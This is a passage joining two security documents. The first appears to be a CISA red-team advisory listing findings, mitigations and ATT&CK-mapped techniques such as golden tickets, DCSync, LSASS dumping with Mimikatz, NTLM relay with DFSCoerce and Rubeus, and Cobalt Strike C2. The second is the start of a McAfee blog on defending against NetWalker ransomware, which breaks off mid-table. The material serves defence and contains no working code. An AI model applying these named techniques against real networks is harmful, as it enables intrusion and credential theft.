Data Exfiltration—1 GB of Data Send a large amount (1 GB) of mock sensitive information to an external system over various protocols, including ICMP, DNS, FTP, and/or HTTP/S. Exfiltration Over Alternative
Protocol
[T1048] Network Monitoring and Analysis Tools Intrusion Detection or Prevention Systems Endpoint Protection Platform Detect target hosts and ports Identify associated scanning process Analyze scanning host once detected Develop response plan None Malicious Traffic Generation—Workstation to External Host Establish a session that originates from a target Workstation system directly to an external host over a clear text protocol, such as HTTP. 
Application Layer Protocol
[T1071] Intrusion Detection or Prevention Systems Endpoint Protection Platform Windows Event Logs Detect and Identify source IP and source process of enumeration Analyze scanning host once detected Develop response plan None Active Directory Account Lockout Lock out several administrative AD accounts Account Access Removal
[T1531] Windows Event Logs End User Reporting Detect and Identify source IP and source process of exfiltration Analyze host used for exfiltration once detected Develop response plan None Local Admin User Account Creation (workstation) Create a local administrator account on a target workstation system. 
Create Account: Local Account [T1136.001] Account Manipulation [T1098] Intrusion Detection or Prevention Systems Endpoint Protection Platform Web Proxy Logs Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan None Local Admin User Account Creation (server) Create a local administrator account on a target server system. 
Create Account: Local Account [T1136.001] Account Manipulation [T1098] Windows Event Logs Detect account creation Identify source of change Verify change with system owner Develop response plan 
None Active Directory Account Creation Create AD accounts and add it to domain admins group Create Account:
Domain Account
[T1136.002] Account Manipulation [T1098] Windows Event Logs Detect account creation Identify source of change Verify change with system owner 
Develop response plan None Workstation Admin Lateral Movement—Workstation to Workstation Use a previously compromised workstation admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on several target Workstations. 
Valid Accounts: Domain Accounts [T1078.002] Remote Services: SMB/Windows Admin Shares, Sub-technique [T1021.002] Create or Modify System Process:
Windows Service [T1543.003] Windows Event Logs Detect account compromise Analyze compromised host Develop response plan None Domain Admin Lateral Movement—Workstation to Domain Controller Use a previously compromised domain admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on a target DC. 
Windows Service [T1543.003] Windows Event Logs Detect account compromise Triage compromised host Develop response plan None Malicious Traffic Generation—Domain Controller to External Host Establish a session that originates from a target Domain Controller system directly to an external host over a clear text protocol, such as HTTP. 
[T1071] Intrusion Detection or Prevention Systems Endpoint Protection Platform Web Proxy Logs Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan None Trigger Host-Based Protection—Domain Controller Upload and execute a well-known (e.g., with a signature) malicious file to a target DC system to generate host-based alerts. 
Ingress Tool Transfer [T1105] Endpoint Protection Platform Endpoint Detection and Response Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan Malicious file was removed by antivirus Ransomware Simulation Execute simulated ransomware on multiple Workstation systems to simulate a ransomware attack. 
Note: This technique does NOT encrypt files on the target system. 
N/A End User Reporting Investigate end user reported event Triage compromised host Develop response Plan Four users reported event to defensive staff Findings Key Issues The red team noted the following key issues relevant to the security of the organization’s network.
These findings contributed to the team’s ability to gain persistent, undetected access across the organization’s sites.
See the Mitigations section for recommendations on how to mitigate these issues. 
Insufficient host and network monitoring.
Most of the red team’s Phase II actions failed to provoke a response from the people, processes, and technology defending the organization’s network.
The organization failed to detect lateral movement, persistence, and C2 activity via their intrusion detection or prevention systems, endpoint protection platform, web proxy logs, and Windows event logs.
Additionally, throughout Phase I, the team received no deconflictions or confirmation that the organization caught their activity.
Below is a list of some of the higher risk activities conducted by the team that were opportunities for detection: Phishing Lateral movement reuse Generation and use of the golden ticket Anomalous LDAP traffic Anomalous internal share enumeration Unconstrained Delegation server compromise DCSync Anomalous account usage during lateral movement Anomalous outbound network traffic Anomalous outbound SSH connections to the team’s cloud servers from workstations Lack of monitoring on endpoint management systems.
The team used the organization’s MDM system to gain root access to machines across the organization’s network without being detected.
Endpoint management systems provide elevated access to thousands of hosts and should be treated as high value assets (HVAs) with additional restrictions and monitoring. 
KRBTGT never changed.
The Site 1 krbtgt account password had not been updated for over a decade.
The krbtgt account is a domain default account that acts as a service account for the key distribution center (KDC) service used to encrypt and sign all Kerberos tickets for the domain.
Compromise of the krbtgt account could provide adversaries with the ability to sign their own TGTs, facilitating domain access years after the date of compromise.
The red team was able to use the krbtgt account to forge TGTs for multiple accounts throughout Phase I. Excessive permissions to standard users.
The team discovered several standard user accounts that have local administrator access to critical servers.
This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an Unconstrained Delegation host and compromise the entire domain. 
Hosts with Unconstrained Delegation enabled unnecessarily.
Hosts with Unconstrained Delegation enabled store the Kerberos TGTs of all users that authenticate to that host, enabling actors to steal service tickets or compromise krbtgt accounts and perform golden ticket or “silver ticket” attacks.
The team performed an NTLM-relay attack to obtain the DC’s TGT, followed by a golden ticket attack on a SharePoint server with Unconstrained Delegation to gain the ability to impersonate any Site 1 AD account. Use of non-secure default configurations.
The organization used default configurations for hosts with Windows Server 2012 R2.
The default configuration allows unprivileged users to query group membership of local administrator groups.
The red team used and identified several standard user accounts with administrative access from a Windows Server 2012 R2 SharePoint server. 
Additional Issues The team noted the following additional issues. 
Ineffective separation of privileged accounts.
Some workstations allowed unprivileged accounts to have local administrator access; for example, the red team discovered an ordinary user account in the local admin group for the SharePoint server.
If a user with administrative access is compromised, an actor can access servers without needing to elevate privileges.
Administrative and user accounts should be separated, and designated admin accounts should be exclusively used for admin purposes. 
Lack of server egress control.
Most servers, including domain controllers, allowed unrestricted egress traffic to the internet. 
Inconsistent host configuration.
The team observed inconsistencies on servers and workstations within the domain, including inconsistent membership in the local administrator group among different servers or workstations.
For example, some workstations had “Server Admins” or “Domain Admins” as local administrators, and other workstations had neither. 
Potentially unwanted programs.
The team noticed potentially unusual software, including music software, installed on both workstations and servers.
These extraneous software installations indicate inconsistent host configuration (see above) and increase the attack surfaces for malicious actors to gain initial access or escalate privileges once in the network. 
Mandatory password changes enabled.
During the assessment, the team keylogged a user during a mandatory password change and noticed that only the final character of their password was modified.
This is potentially due to domain passwords being required to be changed every 60 days. 
Smart card use was inconsistent across the domain.
While the technology was deployed, it was not applied uniformly, and there was a significant portion of users without smartcard protections enabled.
The team used these unprotected accounts throughout their assessment to move laterally through the domain and gain persistence. 
Noted Strengths The red team noted the following technical controls or defensive measures that prevented or hampered offensive actions: The organization conducts regular, proactive penetration tests and adversarial assessments and invests in hardening their network based on findings. 
The team was unable to discover any easily exploitable services, ports, or web interfaces from more than three million external in-scope IPs.
This forced the team to resort to phishing to gain initial access to the environment. 
Service account passwords were strong.
The team was unable to crack any of the hashes obtained from the 610 service accounts pulled.
This is a critical strength because it slowed the team from moving around the network in the initial parts of the Phase I. 
The team did not discover any useful credentials on open file shares or file servers.
This slowed the progress of the team from moving around the network. 
MFA was used for some SBSs.
The team was blocked from moving to SBS 2 by an MFA prompt. 
There were strong security controls and segmentation for SBS systems.
Direct access to SBS were located in separate networks, and admins of SBS used workstations protected by local firewalls. 
MITIGATIONS CISA recommends organizations implement the recommendations in Table 2 to mitigate the issues listed in the Findings section of this advisory.
These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST).
The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement.
CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures.
See CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections. 
Table 2: Recommendations to Mitigate Identified Issues Issue Recommendation Insufficient host and network monitoring Establish a security baseline of normal network traffic and tune network appliances to detect anomalous behavior [CPG 3.1].
Tune host-based products to detect anomalous binaries, lateral movement, and persistence techniques. 
Create alerts for Windows event log authentication codes, especially for the domain controllers.
This could help detect some of the pass-the-ticket, DCSync, and other techniques described in this report. 
From a detection standpoint, focus on identity and access management (IAM) rather than just network traffic or static host alerts. 
Consider who is accessing what (what resource), from where (what internal host or external location), and when (what day and time the access occurs). 
Look for access behavior that deviates from expected or is indicative of AD abuse. 
Reduce the attack surface by limiting the use of legitimate administrative pathways and tools such as PowerShell, PSExec, and WMI, which are often used by malicious actors.
CISA recommends selecting one tool to administer the network, ensuring logging is turned on [CPG 3.1], and disabling the others. 
Consider using “honeypot” service principal names (SPNs) to detect attempts to crack account hashes
[CPG 1.1]. Conduct regular assessments to ensure processes and procedures are up to date and can be followed by security staff and end users. 
Consider using red team tools, such as SharpHound, for AD enumeration to identify users with excessive privileges and misconfigured hosts (e.g., with Unconstrained Delegation enabled). 
Ensure all commercial tools deployed in your environment are regularly tuned to pick up on relevant activity in your environment. 
Lack of monitoring on endpoint management systems Treat endpoint management systems as HVAs with additional restrictions and monitoring because they provide elevated access to thousands of hosts. 
KRBTGT never changed Change the krbtgt account password on a regular schedule such as every 6 to 12 months or if it becomes compromised.
Note that this password change must be carefully performed to effectively change the credential without breaking AD functionality.
The password must be changed twice to effectively invalidate the old credentials.
However, the required waiting period between resets must be greater than the maximum lifetime period of Kerberos tickets, which is 10 hours by default.
See Microsoft’s KRBTGT account maintenance considerations guidance for more information. 
Excessive permissions to standard users and ineffective separation of privileged accounts Implement the principle of least privilege: Grant standard user rights for standard user tasks such as email, web browsing, and using line-of-business (LOB) applications. 
Periodically audit standard accounts and minimize where they have privileged access. 
Periodically Audit AD permissions to ensure users do not have excessive permissions and have not been added to admin groups. 
Evaluate which administrative groups should administer which servers/workstations.
Ensure group members administrative accounts instead of standard accounts. 
Separate administrator accounts from user accounts [CPG 1.5].
Only allow designated admin accounts to be used for admin purposes.
If an individual user needs administrative rights over their workstation, use a separate account that does not have administrative access to other hosts, such as servers. Consider using a privileged access management (PAM) solution to manage access to privileged accounts and resources
[CPG 3.4].
PAM solutions can also log and alert usage to detect any unusual activity and may have helped stop the red team from accessing resources with admin accounts.
Note: password vaults associated with PAM solutions should be treated as HVAs with additional restrictions and monitoring (see below). 
Configure time-based access for accounts set at the admin level and higher.
For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege, as well as the Zero Trust model.
This is a process in which a network-wide policy is set in place to automatically disable administrator accounts at the AD level when the account is not in direct need.
When individual users need the account, they submit their requests through an automated process that enables access to a system but only for a set timeframe to support task completion. 
Hosts with Unconstrained Delegation enabled Remove Unconstrained Delegation from all servers.
If Unconstrained Delegation functionality is required, upgrade operating systems and applications to leverage other approaches (e.g., constrained delegation) or explore whether systems can be retired or further isolated from the enterprise.
CISA recommends Windows Server 2019 or greater. Consider disabling or limiting NTLM and WDigest Authentication if possible, including using their use as criteria for prioritizing updates to legacy systems or for segmenting the network.
Instead use more modern federation protocols (SAML, OIDC) or Kerberos for authentication with AES-256 bit encryption [CPG 3.4]. 
If NTLM must be enabled, enable Extended Protection for Authentication (EPA) to prevent some NTLM-relay attacks, and implement SMB signing to prevent certain adversary-in-the-middle and pass-the-hash attacks CPG 3.4].
See Microsoft Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS) and Microsoft Overview of Server Message Block signing for more information. 
Use of non-secure default configurations Keep systems and software up to date
[CPG 5.1].
If updates cannot be uniformly installed, update insecure configurations to meet updated standards. Lack of server egress control Configure internal firewalls and proxies to restrict internet traffic from hosts that do not require it.
If a host requires specific outbound traffic, consider creating an allowlist policy of domains. 
Large number of credentials in a shared vault Treat password vaults as HVAs with additional restrictions and monitoring [CPG 3.4]: If on-premise, require MFA for admin and apply network segmentation [CPG 1.3].
Use solutions with end-to-end encryption where applicable [CPG 3.3]. 
If cloud-based, evaluate the provider to ensure use of strong security controls such as MFA and end-to-end encryption
[CPG 1.3, 3.3]. Inconsistent host configuration Establish a baseline/gold-image for workstations and servers and deploy from that image
[CPG 2.5].
Use standardized groups to administer hosts in the network. 
Potentially unwanted programs Implement software allowlisting to ensure users can only install software from an approved list
[CPG 2.1]. 
Remove unnecessary, extraneous software from servers and workstations. 
Mandatory password changes enabled Consider only requiring changes for memorized passwords in the event of compromise.
Regular changing of memorized passwords can lead to predictable patterns, and both CISA and the National Institute of Standards and Technology (NIST) recommend against changing passwords on regular intervals. 
Additionally, CISA recommends organizations implement the mitigations below to improve their cybersecurity posture: Provide users with regular training and exercises, specifically related to phishing emails
[CPG 4.3].
Phishing accounts for majority of initial access intrusion events. 
Enforce phishing-resistant MFA to the greatest extent possible [CPG 1.3]. 
Reduce the risk of credential compromise via the following: Place domain admin accounts in the protected users group to prevent caching of password hashes locally; this also forces Kerberos AES authentication as opposed to weaker RC4 or NTLM. 
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information).
For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA). 
Refrain from storing plaintext credentials in scripts [CPG 3.4].
The red team discovered a PowerShell script containing plaintext credentials that allowed them to escalate to admin. 
Upgrade to Windows Server 2019 or greater and Windows 10 or greater.
These versions have security features not included in older operating systems. 
As a long-term effort, CISA recommends organizations prioritize implementing a more modern, Zero Trust network architecture that: Leverages secure cloud services for key enterprise security capabilities (e.g., identity and access management, endpoint detection and response, policy enforcement). 
Upgrades applications and infrastructure to leverage modern identity management and network access practices. 
Centralizes and streamlines access to cybersecurity data to drive analytics for identifying and managing cybersecurity risks. 
Invests in technology and personnel to achieve these goals. 
CISA encourages organizational IT leadership to ask their executive leadership the question: Can the organization accept the business risk of NOT implementing critical security controls such as MFA?
Risks of that nature should typically be acknowledged and prioritized at the most senior levels of an organization. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory.
CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
To get started: Select an ATT&CK technique described in this advisory (see Table 3). 
Align your security technologies against the technique. 
Test your technologies against the technique. 
Analyze your detection and prevention technologies’ performance. 
Repeat the process for all security technologies to obtain a set of comprehensive performance data. 
Tune your security program, including people, processes, and technologies, based on the data generated by this process. 
CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory. 
RESOURCES See CISA’s RedEye tool on CISA’s GitHub page.
RedEye is an interactive open-source analytic tool used to visualize and report red team command and control activities.
See CISA’s RedEye tool overview video for more information. 
REFERENCES 
[1] Bleeping Computer: New DFSCoerce NTLM Relay attack allows Windows domain takeover APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES See Table 3 for all referenced red team tactics and techniques in this advisory.
Note: activity was from Phase I unless noted. 
Table 3: Red Team ATT&CK Techniques for Enterprise Reconnaissance Technique Title ID Use Gather Victim Identity Information: Email Addresses T1589.002 
The team found employee email addresses via open-source research. 
Gather Victim Identify Information: Employee Names T1589.003 
The team identified employee names via open-source research that could be used to derive email addresses. 
Gather Victim Network Information: Network Security Appliances T1590.006 The team identified the organization’s MDM vendor and leveraged that information to move laterally to SBS-connected assets. 
Gather Victim Org Information T1591 The team conducted open-source research and identified an organizational branch that likely had access to an SBS asset. 
Gather Victim Org Information: Determine Physical Locations T1591.001 
The team conducted open-source research to identify the physical locations of upkeep/management staff of selected assets. 
Search Open Technical Databases: Scan Databases T1596.005 The team queried an MDM SQL database to identify target administrators who recently connected with the MDM. 
Resource Development Technique Title ID Use Acquire Infrastructure T1583 
The team used third-party owned and operated infrastructure throughout their assessment for C2. 
Establish Accounts: Email Accounts T1585.002 
The team used commercially available email platforms for their spearphishing activity. 
Obtain Capabilities: Tool T1588.002 The team used the following tools: Cobalt Strike and Merlin payloads for C2. KeeThief to obtain a decryption key from a KeePass database Rubeus and DFSCoerce in an NTLM relay attack Initial Access Technique Title ID Use Phishing: Spearphishing Link T1566.002 
The team sent spearphishing emails with links to a red-team-controlled domain to gain access to the organization’s systems. 
Execution Technique Title ID Use Native API T1106 The team created a policy via the MDM API, which downloaded and executed a payload on a workstation. 
User Execution T1204 Users downloaded and executed the team’s initial access payloads after clicking buttons to trigger download and execution. 
Persistence Technique Title ID Use Account Manipulation T1098 The team elevated account privileges to administrator and modified the user’s account by adding Create Policy and Delete Policy permissions. 
During Phase II, the team created local admin accounts and an AD account; they added the created AD account to a domain admins group. 
Create Account: Local Account T1136.001 During Phase II, the team created a local administrator account on a workstation and a server. 
Create Account:
Domain Account T1136.002 During Phase II, the team created an AD account. 
Create or Modify System Process:
Windows Service T1543.003 During Phase II, the team leveraged compromised workstation and domain admin accounts to execute a payload via Windows Service Creation on target workstations and the DC. 
Event Triggered Execution: Windows Management Instrumentation Event Subscription T1546.003 
The team used WMI Event Subscriptions to move laterally between sites. 
Hijack Execution Flow: DLL Search Order Hijacking T1574.001 
The team used DLL hijacking to move laterally between sites. 
Privilege Escalation Technique Title ID Use Abuse Elevation Control Mechanism T1548 The team elevated user account privileges to administrator by modifying the user’s account via adding Create Policy and Delete Policy permissions. 
Defense Evasion Technique Title ID Use Valid Accounts: Domain Accounts T1078.002 During Phase II
, the team compromised a domain admin account and used it to laterally to multiple workstations and the DC. 
Credential Access Technique Title ID Use OS Credential Dumping: LSASS Memory T1003.001 
The team obtained the cached credentials from a SharePoint server account by taking a snapshot of lsass.exe with a tool called nanodump, exporting the output and processing the output offline with Mimikatz. 
OS Credential Dumping: DCSync T1003.006 The team harvested AES-256 hashes via DCSync. 
Brute Force: Password Cracking T1110.002 
The team cracked a user’s workstation account password after learning the user’s patterns from plaintext credentials. 
Unsecured Credentials T1552 The team found backups of a MySQL database that contained the encryption key needed to decrypt SSH passwords. 
Unsecured Credentials: Credentials in Files T1552.001 
The team found plaintext credentials to an API user account stored in PowerShell scripts on an MDM server. 
Unsecured Credentials: Bash History T1552.003 The team found bash history files on a Workstation 5, and the files appeared to be SSH passwords saved in bash history. 
Credentials from Password Stores: Password Managers T1555.005 
The team pulled credentials from a KeePass database. 
Adversary-in-the-middle: LLMNR/NBT-NS Poisoning and SMB Relay T1557.001 
The team ran the DFSCoerce python script, which prompted DC authentication to a server using the server’s NTLM hash.
The team then deployed Rubeus to capture the incoming DC TGT. Steal or Forge Kerberos Tickets: Golden Ticket T1558.001 
The team used the acquired krbtgt account hash throughout their assessment to forge legitimate TGTs. Steal or Forge Kerberos Tickets: Kerberoasting T1558.003 The team leveraged Rubeus and DFSCoerce in a NTLM relay attack to obtain the DC’s TGT from a host with Unconstrained Delegation enabled. 
Discovery Technique Title ID Use System Network Configuration Discovery T1016 
The team queried the AD for information about the network's sites and subnets. 
Remote System Discovery T1018 
The team queried the AD, during phase I and II, for information about computers on the network. 
System Network Connections Discovery T1049 The team listed existing network connections on SCCM Server 1 to reveal an active SMB connection with server 2. Permission Groups Discovery: Domain Groups T1069.002 The team leveraged ldapsearch and dsquery to query and scrape active directory information. 
Account Discovery: Domain Account T1087.002 
The team queried AD for AD users (during Phase I and II), including for members of a SharePoint admin group and several standard user accounts with administrative access. 
Cloud Infrastructure Discovery T1580 The team found SecOps network diagrams on a host detailing cloud infrastructure boundaries. 
Domain Trust Discovery T1482 During Phase II, the team enumerated trust relationships within the AD Forest. 
Group Policy Discovery T1615 The team scraped AD information, including GPOs. 
Network Service Discovery T1046 During Phase II
, the team enumerated ports on target systems from a previously compromised workstation. 
System Owner/User Discovery T1033 
During Phase II, the team enumerated the AD for current session information from every domain computer (Workstation and Server). 
Lateral Movement Technique Title ID Use Remote Services: SMB/Windows Admin Shares T1021.002 
The team moved laterally with an SMB beacon. 
During Phase II, they used compromised workstation and domain admin accounts to upload a payload via SMB on several target Workstations and the DC. 
Use Alternate Authentication Material:
Pass the Hash T1550.002 
The team then deployed Rubeus to capture the incoming DC TGT. 
Pass the Ticket T1550.003 
The team used the asktgt command to impersonate accounts for which they had credentials by requesting account TGTs. Command and Control Technique Title ID Use Application Layer Protocol T1071 The team remotely enumerated the local administrators group on target hosts to find valid user accounts.
This technique relies on anonymous SMB pipe binds, which are disabled by default starting with Server 2016. 
During Phase II, the team established sessions that originated from a target Workstation and from the DC directly to an external host over a clear text protocol. 
Application Layer Protocol: Web Protocols T1071.001 
The team’s C2 redirectors used HTTPS reverse proxies to redirect C2 traffic. 
Application Layer Protocol:
File Transfer Protocols T1071.002 
The team used HTTPS reverse proxies to redirect C2 traffic between target network and the team’s Cobalt Strike servers. 
Encrypted Channel T1573 
The team’s C2 traffic was encrypted in transit using encryption keys stored on their C2 servers. 
Ingress Tool Transfer T1105 
During Phase II, the team uploaded and executed well-known malicious files to the DC to generate host-based alerts. 
Proxy: External Proxy T1090.002 The team used redirectors to redirect C2 traffic between the target organization’s network and the team’s C2 servers. 
Proxy: Domain Fronting T1090.004 The team used domain fronting to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating. 
Impact Technique Title ID Use Account Access Removal T1531 During Phase II, the team locked out several administrative AD accounts. 
Please share your thoughts.
We recently updated our anonymous Product Feedback Survey and we'd welcome your feedback. 
title: McAfee Defender’s Blog: NetWalker url: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-defenders-blog-netwalker/ Building Adaptable Security Architecture Against NetWalker NetWalker Overview The NetWalker ransomware, initially known as Mailto, was first detected in August 2019.
Since then, new variants were discovered throughout 2019 and the beginning of 2020, with a strong uptick noticed in March of this year.
NetWalker has noticeably evolved to a more stable and robust ransomware-as-a-service (RaaS) model, and McAfee research suggests that the malware operators are targeting and attracting a broader range of technically advanced and enterprising criminal affiliates.
McAfee Advanced Threat Research (ATR) discovered a large sum of bitcoins linked to NetWalker which suggest its extortion efforts are effective and that many victims have had no option other than to succumb to its criminal demands.
For more details on NetWalker, see the McAfee ATR blog here. 
We do not want you to be one of those victims, so this blog is focused on how to build an adaptable security architecture to defeat this threat and, specifically, how McAfee’s portfolio delivers the capability to prevent, detect and respond to NetWalker ransomware. 
Gathering Intelligence on NetWalker As always, building adaptable defensive architecture starts with intelligence.
In most organizations, the Security Operations team is responsible for threat intelligence analysis, as well as threat and incident response.
The Preview of McAfee MVISION Insights is a sneak peek of some of MVISION Insights capabilities for the threat intel analyst and threat responder.
The preview identifies the prevalence and severity of select top emerging threats across the globe which enables the Security Operations Center (SOC) to prioritize threat response actions and gather relevant cyber threat intelligence (CTI) associated with the threat, in this case NetWalker ransomware.
The CTI is provided in the form of technical Indicators of Compromise (IOCs) as well as MITRE ATT&CK framework tactics and techniques. 
As a threat intel analyst or responder, you can drill down to gather more specific information on NetWalker, such as prevalence and links to other sources of information. 
As a threat intel analyst or responder, you can further drill down to gather more specific actionable intelligence on NetWalker, such as indicators of compromise and tactics/techniques aligned to the MITRE ATT&CK framework. 
From MVISION Insights preview, you can see that NetWalker leverages tactics and techniques common to other ransomware attacks, such as spear phishing attachments for Initial Access, use of PowerShell for deployment, modification of Registry Keys/Startup folder for persistence and encryption of files for impact of course. 
Defensive Architecture Overview Today’s digital enterprise is a hybrid environment of on-premise systems and cloud services with multiple entry points for attacks like NetWalker.
The work from home operating model forced by COVID-19 has only expanded the attack surface and increased the risk for successful ransomware attack if organizations did not adapt their security posture.
Mitigating the risk of attacks like NetWalker requires a security architecture with the right controls at the device, on the network and in security operations (sec ops).
The Center for Internet Security (CIS) Top 20 Cyber Security Controls provides a good guide to build that architecture.
For ransomware, and NetWalker in particular, the controls must be layered throughout the enterprise.
The following outlines the key security controls needed at each layer of the architecture to protect your enterprise against ransomware. 
To assess your capability against NetWalker, you must match your existing controls against the attack stages we learned from the Preview of MVISION Insights.
For detailed analysis on the NetWalker ransomware attack, see McAfee ATR’s blog but, for simplicity, we matched the attack stages to the MITRE ATT&CK Framework below. 
Initial Access Stage Defensive Overview 
According to Threat Intelligence and Research, the initial access is performed either through vulnerability exploitation or spear phishing attachments.
The following chart summarizes the controls expected to have the most effect against initial stage techniques and the McAfee solutions to implement those controls where possible. 
MITRE Tactic MITRE Techniques CSC Controls McAfee Capability Initial Access Exploit Public-Facing Applications (T1190) Tomcat, Web Logic CSC 2 Inventory of Software Assets 
CSC 3 Continuous Vulnerability Assessment CSC 5 Secure Configuration of hardware and software CSC 9 Limitation of Network Ports and Protocols CSC 12 Boundary Defense CSC 18 Application Software Security Endpoint Security Platform 10.7, Threat Prevention, Application Control (MAC) Network Security Platform (NSP) 
Initial Access Spear Phishing Attachments (T1566.001) 
CSC 7 – Email and Web Browser Protection CSC 8 – Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Web Gateway (MWG), Advanced Threat Defense, Web Gateway Cloud Service (WGCS) Initial Access Valid Accounts (T1078) RDP Compromised CSC 5 Secure Configuration of hardware and software CSC 9 Limitation of Network Ports and Protocols CSC 12 Boundary Defense Endpoint Security Platform 10.7, Threat Prevention 
As attackers can quickly change spear phishing attachments, it is important to have adaptable defenses that include user awareness training and response procedures, behavior-based malware defenses on email systems, web access and endpoint systems, and finally sec ops playbooks for early detection and response against suspicious email attachments or other phishing techniques.
For more information on how McAfee can protect against suspicious email attachments, review this additional blog post. Using valid accounts and protocols, such as for Remote Desktop Protocol, is an attack technique we have seen rise during the initial COVID-19 period.
To further understand how McAfee defends against RDP as an initial access vector, as well as how the attackers are using it to deploy ransomware, please see our previous posts. 
https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rdp-security-explained/ https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cybercriminals-actively-exploiting-rdp-to-target-remote-organizations/ https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ens-10-7-rolls-back-the-curtain-on-ransomware/ Exploitation Stage Defensive Overview 
The exploitation stage is where the attacker gains access to the target system.
Protection at this stage is heavily dependent on system vulnerability management, adaptable anti-malware on both end user devices and servers and security operations tools like endpoint detection and response sensors. 
McAfee Endpoint Security 10.7 provides a defense in depth capability including signatures and threat intelligence to cover known bad indicators or programs. 
Additionally, machine-learning and behavior-based protection reduces the attack surface against NetWalker and detects new exploitation attack techniques. 
For more information on how McAfee Endpoint Security 10.7 can prevent or identify the techniques used in NetWalker, review these additional blog posts. 
https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ens-10-7-rolls-back-the-curtain-on-ransomware/ https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-amsi-integration-protects-against-malicious-scripts/ https://www.mcafee.com/blogs/other-blogs/mcafee-labs/how-to-use-mcafee-atp-to-protect-against-emotet-lemonduck-and-powerminer/ The following chart summarizes the critical security controls expected to have the most effect against exploitation stage techniques and the McAfee solutions to implement those controls where possible. MITRE Tactic MITRE Techniques CSC Controls McAfee Portfolio Mitigation Execution PowerShell (T1059.001)
PowerShell Script CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Service Execution (T1569.002)
PS Exec CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Command and Scripting Interpreter (T1059.003) Windows Command Shell CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Native API (T1106) Use Windows API functions to inject DLL CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Execution Windows Management Instrumentation ((T1047) 
CSC 4 Controlled Use of Admin Privileges CSC 5 Secure Configuration CSC 9 Limitation of Network Ports and Protocols CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Persistence Registry Key – Place Value on Run Once Key (T1060) 
CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7 Threat Prevention Persistence Modify Registry key – Create own key (T1112) 
CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7 Threat Prevention Privilege Escalation Exploitation for Privilege Exploitation ((T1068) CVE-2020-0796 CSC 3 Vulnerability Management CSC 5 Secure Configuration CSC 8 Malware Defenses CSC 12 Boundary Defenses Network Security Platform (CVE-2020-0796) Privilege Escalation Exploitation for Privilege Exploitation ((T1068) CVE-2019-1458 CSC 3 Vulnerability Management CSC 5 Secure Configuration CSC 8 Malware Defenses CSC 12 Boundary Defenses Network Security Platform (CVE-2019-1458); Endpoint Security Platform 10.7 (CVE-2019-1458) Threat Prevention, Application Control (MAC) Privilege Escalation Exploitation for Privilege Exploitation ((T1068) CVE-2017-0213 CSC 3 Vulnerability Management CSC 5 Secure Configuration CSC 8 Malware Defenses CSC 12 Boundary Defenses Network Security Platform (CVE-2017-0213); Endpoint Security Platform 10.7 (CVE-2017-0213) Threat Prevention, Application Control (MAC) Privilege Escalation Exploitation for Privilege Exploitation ((T1068) CVE-2015-1701 CSC 3 Vulnerability Management CSC 5 Secure Configuration CSC 8 Malware Defenses CSC 12 Boundary Defenses Network Security Platform (CVE-2015-1701); Endpoint Security Platform 10.7, Threat Prevention, Application Control (MAC) Privilege Escalation Process Injection: Reflective DLL (T1055) 
CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, MVISION EDR Defensive Evasion Disabling Security Tools (T1562.001) ESET, Trend Micro, MS CSC 5 Secure Configuration CSC 8 Malware Defenses Defensive Evasion Process Injection: Reflective DLL (T1055) 
